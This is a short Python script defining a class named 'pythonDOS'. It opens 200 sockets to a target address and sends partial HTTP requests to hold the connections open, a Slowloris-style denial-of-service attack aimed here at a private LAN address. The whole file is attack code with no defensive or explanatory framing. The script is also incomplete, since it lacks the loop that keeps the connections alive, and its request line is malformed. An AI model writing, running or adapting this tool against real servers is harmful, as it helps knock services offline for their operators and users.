# Import dependencies
import socket, random, time, sys


# Class definition
class pythonDOS():

    # Class init function, initialize object, use default values on the initialize to keep it simple on production
    def __init__(self, ip, port=80, socketsCount = 200):
        self._ip = ip
        self._port = port
        self._headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ]
        self._sockets = [self.newSocket() for _ in range(socketsCount)]

    # Function to create new sockets, each socket is a connection
    def newSocket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self._ip, self._port))
            s.send(self.getMessage("Get /?"))
            for header in self._headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as se:
            print("Error: "+str(se))
            time.sleep(0.5)
            return self.newSocket()

    # Create the message requested to target server
    def getMessage(self, message):
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")

# Main function
if __name__ == "__main__":
    dos = pythonDOS("192.168.0.236", 81, socketsCount=200)